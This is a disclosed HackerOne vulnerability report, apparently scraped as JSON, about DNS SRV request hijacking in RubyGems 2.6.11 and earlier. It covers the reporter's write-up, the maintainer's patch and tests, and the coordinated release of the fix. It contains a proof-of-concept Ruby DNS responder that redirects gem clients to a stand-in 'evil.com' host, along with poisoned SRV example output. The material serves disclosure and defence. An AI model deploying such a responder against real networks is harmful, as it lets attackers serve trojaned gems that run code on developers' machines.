{
    "id": 218088,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTgwODg=",
    "url": "https://hackerone.com/reports/218088",
    "title": "Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier",
    "state": "Closed",
    "substate": "resolved",
    "severity_rating": "high",
    "readable_substate": "Resolved",
    "created_at": "2017-04-02T17:31:05.933Z",
    "submitted_at": "2017-04-02T17:31:05.933Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "claudijd",
        "url": "/claudijd",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 8212,
        "url": "https://hackerone.com/rubygems",
        "handle": "rubygems",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "open",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "RubyGems",
            "twitter_handle": "rubygems_status",
            "website": "https://rubygems.org",
            "about": "RubyGems.org is the Ruby communityâ€™s gem hosting service."
        }
    },
    "has_bounty?": true,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [
        "CVE-2017-0902",
        "CVE-2015-3900",
        "CVE-2015-4020"
    ],
    "singular_disclosure_disabled": false,
    "disclosed_at": "2017-08-30T23:36:42.991Z",
    "bug_reporter_agreed_on_going_public_at": null,
    "team_member_agreed_on_going_public_at": "2017-08-28T16:41:24.208Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned \nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\t\n    RubyDNS::run_server(:listen => INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Recommendations:**\n\nConsider this small patch to address the immediate attack vector...\n\n    -      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n    +      if (/\\.#{Regexp.quote(host)}\\z/ =~ target) && !target.include?(\"/\")\n\nAlso, consider moving away from doing API discovery via DNS.  Would recommend \nmoving to HTTPS, where you will have a stronger transport security chain.\n\n**References (these are not new, just references prior work here to help triage team understand impact):**\n\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\n- https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\n- http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html",
    "weakness": {
        "id": 70,
        "name": "Code Injection"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [],
    "allow_singular_disclosure_at": "2017-09-27T16:41:24.243Z",
    "allow_singular_disclosure_after": -186765507.3674032,
    "singular_disclosure_allowed": true,
    "vote_count": 10,
    "voters": [
        "sp1d3rs",
        "jobert",
        "ysx",
        "claudijd",
        "geeknik",
        "r3y",
        "eveeez",
        "marwan",
        "corycomplex",
        "sonalkr132"
    ],
    "severity": {
        "rating": "high",
        "author_type": "User"
    },
    "structured_scope": null,
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 1579173,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.",
            "automated_response": true,
            "created_at": "2017-04-02T17:31:06.102Z",
            "updated_at": "2017-04-02T17:31:06.102Z",
            "actor": {
                "url": "/rubygems",
                "ibb": true,
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "profile": {
                    "name": "RubyGems"
                }
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1603236,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Any update on this issue?",
            "automated_response": false,
            "created_at": "2017-04-10T19:05:04.416Z",
            "updated_at": "2017-04-10T19:05:04.416Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1603274,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Also, regarding recommendations, you may also consider defining a white-list of acceptable characters that fit just hostnames (this would eliminate other possible evasion techniques, like ? or #).  This would be preferred over simply black-listing \"/\" as I suggested above.",
            "automated_response": false,
            "created_at": "2017-04-10T19:16:24.562Z",
            "updated_at": "2017-04-10T19:16:49.969Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1603300,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "I guess we could also parse the target as a URI and check if its host end with the given host?",
            "automated_response": false,
            "created_at": "2017-04-10T19:26:11.750Z",
            "updated_at": "2017-04-10T19:26:11.750Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1603360,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@segiddins target in this context should be a hostname and not a URI.  If you parse with URI without specifying a scheme, I think host/hostname will be nil...\n\n    2.2.3 :012 > target\n     => \"evil.com/api.rubygems.org\" \n    2.2.3 :013 > uri = URI(target).host\n     => nil \n    2.2.3 :014 > uri = URI(target).hostname\n     => nil \n    2.2.3 :015 > uri = URI(\"https://\" + target).hostname\n     => \"evil.com\"\n\nBut, in essence, I think that would solve the issue on faking out the host regex.\n\n\n",
            "automated_response": false,
            "created_at": "2017-04-10T19:45:09.225Z",
            "updated_at": "2017-04-10T19:47:30.590Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1603381,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Here's a couple other use cases I could think of to test out the URI parsing strategy...\n\n    2.2.3 :020 > URI(\"https://\" + \"evil.com/api.rubygems.org\").hostname\n     => \"evil.com\" \n    2.2.3 :021 > URI(\"https://\" + \"evil.com?api.rubygems.org\").hostname\n     => \"evil.com\" \n    2.2.3 :022 > URI(\"https://\" + \"evil.com#api.rubygems.org\").hostname\n     => \"evil.com\"\n\nThey all look good to me.",
            "automated_response": false,
            "created_at": "2017-04-10T19:52:34.665Z",
            "updated_at": "2017-04-10T19:52:47.518Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1631625,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "It's been about 3 weeks since the initial report.  Is there a sense for when a fixed release for this might be able to the public?",
            "automated_response": false,
            "created_at": "2017-04-24T18:21:34.641Z",
            "updated_at": "2017-04-24T18:21:34.641Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1646785,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Whenever someone makes the fix? I'll try and do this if no one beats me to it...",
            "automated_response": false,
            "created_at": "2017-05-01T17:14:37.417Z",
            "updated_at": "2017-05-01T17:14:58.497Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1646793,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "If this is sufficient...\n\n```diff\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n--- a/lib/rubygems/remote_fetcher.rb\n+++ b/lib/rubygems/remote_fetcher.rb\n@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n \n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if URI(\"http://\" + target).hostname.end_with?(\".#{host}\")\n         return URI.parse \"#{uri.scheme}://#{target}#{uri.path}\"\n       end\n \ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n--- a/test/rubygems/test_gem_remote_fetcher.rb\n+++ b/test/rubygems/test_gem_remote_fetcher.rb\n@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n \n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse \"http://example.com/foo\"\n+    target = MiniTest::Mock.new\n+    target.expect :target, \"evil.com/a.example.com\"\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\"http://example.com/foo\"), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n   def test_api_endpoint_timeout_warning\n     uri = URI.parse \"http://gems.example.com/foo\"\n \n\n```",
            "automated_response": false,
            "created_at": "2017-05-01T17:21:59.685Z",
            "updated_at": "2017-05-01T17:21:59.685Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1646895,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "This is the proposed patch atop v2.6.12\n\n```patch\nFrom 16d44ce98a2a26bd02b35d1fe49056a1e7a865da Mon Sep 17 00:00:00 2001\nFrom: Samuel Giddins <segiddins@segiddins.me>\nDate: Mon, 1 May 2017 12:41:29 -0500\nSubject: [PATCH] [RemoteFetcher] Avoid DNS Hijacking Vulnerability\n\nReported by @claudijd\n\n**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned\nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\n    RubyDNS::run_server(:listen => INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Fix:**\n\nBy parsing the returned target as a URI and only matching against the\n`hostname`, we can ensure that only subdomains of the original host\nare redirected to. This way, adding URI-delimiting characters to the\n`target` cannot be used to front-pad the target, creating a\nfalse-positive match.\n---\n lib/rubygems/remote_fetcher.rb           |  2 +-\n test/rubygems/test_gem_remote_fetcher.rb | 15 +++++++++++++++\n 2 files changed, 16 insertions(+), 1 deletion(-)\n\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n--- a/lib/rubygems/remote_fetcher.rb\n+++ b/lib/rubygems/remote_fetcher.rb\n@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n \n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if URI(\"http://\" + target).hostname.end_with?(\".#{host}\")\n         return URI.parse \"#{uri.scheme}://#{target}#{uri.path}\"\n       end\n \ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n--- a/test/rubygems/test_gem_remote_fetcher.rb\n+++ b/test/rubygems/test_gem_remote_fetcher.rb\n@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n \n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse \"http://example.com/foo\"\n+    target = MiniTest::Mock.new\n+    target.expect :target, \"evil.com/a.example.com\"\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\"http://example.com/foo\"), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n   def test_api_endpoint_timeout_warning\n     uri = URI.parse \"http://gems.example.com/foo\"\n \n-- \n2.11.0\n```",
            "automated_response": false,
            "created_at": "2017-05-01T17:45:32.466Z",
            "updated_at": "2017-05-01T17:45:32.466Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1651572,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@segiddins my apologies, I would have totally written the patch and tests for this based on our prior discussion.  I've reviewed the patch you've created and believe it's sufficient to address this issue.  In the future, for security related issues, would you prefer I send a PR or is including the patch diff here the preferred medium?",
            "automated_response": false,
            "created_at": "2017-05-03T14:59:33.364Z",
            "updated_at": "2017-05-03T14:59:33.364Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1651832,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hey, I'm sorry if I came across a bit short earlier. We really appreciate you reporting the vulnerability and working with us to understand the problem and tease out a fix. There's no need for you to write patches for things you report (unless you want to!, and in which case I think a patch shared here is preferable), but since RubyGems is an open-source project that gets very little of my paid time (from RubyTogether) and is otherwise entirely volunteer-driven, estimating when undeveloped work will ship is next to impossible.\n\nAs soon as another RubyGems maintainer reviews the patch, I'll release it. I think we just want to minimize the amount of time a patch is sitting on GitHub for vulnerabilities, particularly with tests that demonstrate how to exploit them. I hope this all is sensible, I'm still getting the hang of being responsible for security issues.",
            "automated_response": false,
            "created_at": "2017-05-03T16:29:55.782Z",
            "updated_at": "2017-05-03T16:29:55.782Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1652178,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "All sounds sensible to me.  Also, I'm totally willing and able to write patches for bugs I find in the future.",
            "automated_response": false,
            "created_at": "2017-05-03T18:59:45.930Z",
            "updated_at": "2017-05-03T18:59:45.930Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1807335,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "The fix will be released as soon as we can get some other fixes in order.",
            "automated_response": false,
            "created_at": "2017-07-05T14:47:41.379Z",
            "updated_at": "2017-07-05T14:47:41.379Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1808621,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@segiddins thanks for the update, hope all is good!",
            "automated_response": false,
            "created_at": "2017-07-05T19:32:10.693Z",
            "updated_at": "2017-07-05T19:32:10.693Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1939064,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@segiddins how's it going? Just checking in to see if there is anything I can do to help move this along to release to protect RubyGems end users.",
            "automated_response": false,
            "created_at": "2017-08-18T14:45:33.954Z",
            "updated_at": "2017-08-18T14:46:12.927Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1958763,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugResolved",
            "message": "Released in http://blog.rubygems.org/2017/08/27/2.6.13-released.html",
            "automated_response": false,
            "created_at": "2017-08-28T02:07:45.197Z",
            "updated_at": "2017-08-28T02:07:45.197Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "reporter": {
                "username": "claudijd",
                "url": "/claudijd"
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1958765,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ExternalUserJoined",
            "message": "",
            "automated_response": false,
            "created_at": "2017-08-28T02:08:27.449Z",
            "updated_at": "2017-08-28T02:08:27.449Z",
            "additional_data": {
                "report_permissions": null,
                "duplicate_report_id": 243005
            },
            "actor": {
                "username": "mame",
                "cleared": false,
                "verified": false,
                "url": "/mame",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1959679,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Can this report be made public?",
            "automated_response": false,
            "created_at": "2017-08-28T13:24:27.606Z",
            "updated_at": "2017-08-28T13:24:27.606Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1959748,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Can I also be CC'd on the duplicate bug?",
            "automated_response": false,
            "created_at": "2017-08-28T13:50:11.207Z",
            "updated_at": "2017-08-28T13:50:11.207Z",
            "actor": {
                "username": "claudijd",
                "cleared": false,
                "verified": false,
                "url": "/claudijd",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1960045,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "> Can this report be made public?\n\nSure\n\n> Can I also be CC'd on the duplicate bug?\n\nI have no idea how to do that\n",
            "automated_response": false,
            "created_at": "2017-08-28T14:41:32.393Z",
            "updated_at": "2017-08-28T14:41:32.393Z",
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1960606,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2017-08-28T16:41:24.228Z",
            "updated_at": "2017-08-28T16:41:24.228Z",
            "first_to_agree": true,
            "actor": {
                "username": "segiddins",
                "cleared": false,
                "verified": false,
                "url": "/segiddins",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1967703,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@claudijd I have CCed you on the duplicate bug.",
            "automated_response": false,
            "created_at": "2017-08-30T23:31:41.700Z",
            "updated_at": "2017-08-30T23:31:41.700Z",
            "actor": {
                "username": "indirect",
                "cleared": false,
                "verified": false,
                "url": "/indirect",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
